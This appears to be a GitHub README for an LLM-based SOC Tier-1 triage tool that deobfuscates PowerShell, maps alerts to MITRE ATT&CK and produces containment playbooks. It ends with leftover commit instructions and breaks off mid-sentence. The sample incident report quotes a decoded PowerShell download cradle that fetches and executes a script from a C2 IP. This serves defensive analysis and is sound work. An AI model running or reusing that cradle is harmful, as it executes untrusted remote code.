# AI-Powered SOC Tier-1 Analyst Copilot

An automated SecOps incident triage engine engineered in Python. This project automates Tier-1 alert analysis, deobfuscates adversary command lines, maps tactics to the MITRE ATT&CK framework, and generates standardized incident response containment playbooks using LLM reasoning and structured data validation.

---

## Architecture Overview

```text
[ Raw Telemetry Alert: JSON / SIEM Webhook ]
                     │
                     ▼
          [ 1. Ingestion & Parser ]
   Extracts: Process, Parent Process, CommandLine,
   Registry Targets, File Hashes, Hostname, User
                     │
                     ▼
      [ 2. Deobfuscation & IOC Enricher ]
   * Decodes Base64 UTF-16LE Encoded PowerShell
   * Extracts C2 IP Addresses & URLs via Regex
   * Maps Techniques to MITRE ATT&CK (T1059, T1547)
                     │
                     ▼
     [ 3. AI Reasoning & Triage Engine ]
     (LangChain / Pydantic Output Validation)
   * Evaluates Adversary Intent & Threat Context
   * Computes Risk Severity Score (1 - 10)
   * Formulates Plain-English Attack Narrative
                     │
                     ▼
  [ 4. Standardized SOC Incident Ticket (Markdown) ]
   * Risk Rating & Severity Justification
   * Extracted Observables & IOC Table
   * Prioritized Containment & Isolation Checklist
   * Escalation & Investigation Recommendations
Technical Highlights & Key Competencies
Automated Payload Deobfuscation: Engineered automated regex parsing to detect and decode Base64 UTF-16LE obfuscated PowerShell command strings (-enc), exposing hidden download cradles and C2 IPs.

Adversary Mapping (MITRE ATT&CK): Automatically correlates raw endpoint indicators with specific MITRE ATT&CK techniques, tactics, and adversary objectives.

Structured Data Validation: Implemented Pydantic data schemas with LangChain to enforce strict JSON/Markdown output formatting from LLM reasoning chains.

Alert Fatigue Reduction: Transforms noisy raw SIEM event payloads into human-readable attack narratives and actionable triage playbooks in seconds.

Incident Response Playbook Generation: Automatically authors step-by-step containment checklists (host isolation, PID termination, token revocation) ready for SOC Tier-1 execution.

Visual Proof & Demonstration
1. Automated CLI Triage Execution
The copilot processes multiple alerts in batch, performing real-time deobfuscation, MITRE mapping, and severity scoring:

[cli-runner.png.png]

2. Generated SOC Incident Report
Standardized incident ticket output detailing severity metrics, attack narrative, observables, and containment action items:

[incident-report-evidence.png.png]

Repository Structure
Plaintext
ai-soc-analyst-copilot/
├── alerts/
│   ├── alert_encoded_powershell.json      # Sample input: Base64 obfuscated PowerShell attack
│   └── alert_registry_persistence.json    # Sample input: Registry Run key persistence attack
├── reports/
│   ├── INCIDENT_SEC-ALERT-2026-001.md     # Generated triage report for registry persistence
│   └── INCIDENT_SEC-ALERT-2026-002.md     # Generated triage report for encoded PowerShell
├── enricher.py                            # Observable extraction, Base64 decoding, MITRE mapping
├── ai_analyst.py                          # LLM reasoning, Pydantic schemas, severity scoring
├── main.py                                # CLI automation runner
├── cli-runner.png.png                     # Evidence: Terminal triage execution
└── incident-report-evidence.png.png       # Evidence: Generated incident ticket
Sample Incident Triage Output
Below is an excerpt from a generated report (reports/INCIDENT_SEC-ALERT-2026-002.md):

Markdown
# SOC Incident Triage Report: SEC-ALERT-2026-002

**Timestamp:** 2026-10-10T07:42:01Z  
**Host:** `vm-windows-target` | **User:** `azureuser`  
**Verdict:** **True Positive (High Fidelity)** | **Severity:** `9/10`  

## 1. Attack Narrative
Adversary executed obfuscated PowerShell on host vm-windows-target using Base64 encoding. 
The decoded payload attempts to download and execute an unauthorized remote script. 
This activity maps to MITRE ATT&CK T1059.001.

## 2. Extracted Observables & IOCs
* **process_name:** `powershell.exe`
* **parent_process:** `explorer.exe`
* **decoded_payload:** `IEX (New-Object Net.WebClient).DownloadString('[http://192.168.1.100:8080/secret.ps1](http://192.168.1.100:8080/secret.ps1)')`
* **extracted_ips:** `['192.168.1.100']`

## 3. Recommended Containment Checklist
- [ ] Isolate endpoint 'vm-windows-target' from the corporate network immediately.
- [ ] Terminate offending PowerShell process PID and block extracted C2 IP: 192.168.1.100.
- [ ] Revoke active session tokens for user 'azureuser' and initiate credential reset.
Getting Started & Execution
Prerequisites
Python 3.10+

Virtual Environment (venv)

Installation & Run
Clone the repository:

Bash
git clone [https://github.com/ravishkarathnayaka/ai-soc-analyst-copilot.git](https://github.com/ravishkarathnayaka/ai-soc-analyst-copilot.git)
cd ai-soc-analyst-copilot
Set up virtual environment:

Bash
python -m venv venv
source venv/bin/activate  # On Windows: .\venv\Scripts\Activate.ps1
pip install pydantic python-dotenv langchain langchain-google-genai requests
Run the triage engine:

Bash
python main.py
View generated reports:
Generated triage reports are automatically saved as Markdown files in the reports/ folder.


---

### How to Add It to Your Repository:

1. On your **`ai-soc-analyst-copilot`** GitHub tab (`image_f435dc.png`), click the green button in the center:
   > **`Add a README`**
2. Paste the copied Markdown into the editor.
3. Click the green **Commit changes...** button at the top right.

Both of your evidence screenshots (`cli-runner.png.png` and `incident-report-evidence.png.png`)
